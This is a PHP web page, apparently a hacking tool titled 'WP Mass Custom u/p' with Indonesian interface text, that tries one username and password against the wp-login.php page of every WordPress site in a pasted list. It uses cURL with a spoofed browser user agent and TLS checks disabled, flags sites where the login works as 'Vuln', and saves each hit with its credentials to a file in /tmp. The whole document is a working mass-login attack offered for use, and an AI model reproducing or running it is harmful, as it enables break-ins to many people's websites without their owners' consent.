<html>
<head>
<title>[+] WP Mass Custom u/p [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white" onload="antixss()">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

a {
  color: orange;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

vuln {
  color: green;
}

kgk {
  color: red;
}
oren {
  color: orange;
}

kuning {
  color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Wordpress Mass Custom u/p<br><font size="3">Mass Wordpress Dengan Menggunakan User dan Pass Sendiri<hr>
<form method="post">
<textarea rows=1 name="url" placeholder="http://wordpress.com/
http://wordpress.com/wp-login.php" required="true"  oninvalid="this.setCustomValidity('kalo gada web nya mau hek apa bre ? wkwk')"></textarea><br><br>
User : <input type="text" name="user" class="area" required="" oninvalid="this.setCustomValidity('kalo gada user gimna mau lanjut bre wkwk')"><br>
Pass : <input type="text" name="pass" class="area" required="" oninvalid="this.setCustomValidity('apalagi kalo gada pass wkwk')"><br><br>
<input type="submit" name="go" value="Gaskan"><br>
</form>
<?php
$namafile = basename($_SERVER['REQUEST_URI']);
$random = mt_rand(10000000,99999999);
if (!file_exists("/tmp/tempku")) {
  @mkdir("/tmp/tempku");
}
if (isset($_POST['go'])) {
  $webs = $_POST['url'];
  $user = $_POST['user'];
  $pass = $_POST['pass'];
  echo "<pre style='text-align: left; white-space: pre-line;'><hr>";
  ob_implicit_flush();ob_end_flush();
  echo "[User] : ".htmlspecialchars($user)."\n";
  echo "[Pass] : ".htmlspecialchars($pass)."\n";
  echo "[Total Website] : ".count(explode("\r\n", $webs))."\n\n";
  foreach (explode("\r\n", $webs) as $web) {
    if (strstr($web, "/wp-login.php")) {
      $web = str_replace("wp-login.php", "", $web);
    }
    $target = $web."/wp-login.php";
    $finalurl = finalurl($target);
    $login = loginwp($finalurl, $user, $pass, $random);
    //echo $login['response'];
    if (strstr($login['response'], "confirm_admin_email") && strstr($login['response'], "wordpress_logged_in")) {
      echo "[<vuln>Vuln</vuln>] ".htmlspecialchars($finalurl)."\n";
      @file_put_contents("/tmp/tempku/wpvuln.txt", $finalurl."#".$user."#".$pass."\n", FILE_APPEND);
    } elseif (strstr($login['response'], "wordpress_logged_in")) {
      echo "[<vuln>Vuln</vuln>] ".htmlspecialchars($finalurl)."\n";
      @file_put_contents("/tmp/tempku/wpvuln.txt", $finalurl."#".$user."#".$pass."\n", FILE_APPEND);
    } elseif (strstr($login['response'], "wordpress_test_cookie")) {
      if (strstr($login['response'], "</a></p></div>") || substr_count($login['response'], "wp-login.php?action=lostpassword") === 2) {
        echo "[<kuning>Salah Sandi</kuning>] ".htmlspecialchars($finalurl)."\n";
      } elseif (strstr($login['response'], "is not registered on this site")) {
        echo "[<kuning>Salah User</kuning>] ".htmlspecialchars($finalurl)."\n";
      } else {
        echo "[<oren>Not Found</oren>] ".htmlspecialchars($finalurl)."\n";
      }
    } elseif ($login['http_code'] === "403") {
      echo "[<kgk>403 Forbidden</kgk>] ".htmlspecialchars($finalurl)."\n";
    } elseif (!strstr($login['response'], "user_login") && !strstr($login['response'], "/wp-admin/css/")) {
      echo "[<kgk>No WP Login</kgk>] ".htmlspecialchars($finalurl)."\n";
    } else {
      echo "[<kgk>Unknown</kgk>] ".htmlspecialchars($finalurl)."\n";
    }
  }
  @unlink("/tmp/tempku/cookie_".$random.".tmp");
}
echo "</pre>";

function loginwp($web, $user, $pwd, $random) {    
  $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $web);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $postData = [
        'log' => $user,
        'pwd' => $pwd,
        'wp-submit' => 'Log In'
    ];
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/tempku/cookie_'.$random.'.tmp');
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $redirectedUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);
    return [
        'response' => $response,
        'http_code' => $httpcode,
        'redirect' => $redirectedUrl,
    ];
}

function finalurl($url) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
  $html = curl_exec($ch);
  $redirectedUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
  return $redirectedUrl;
}
?>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>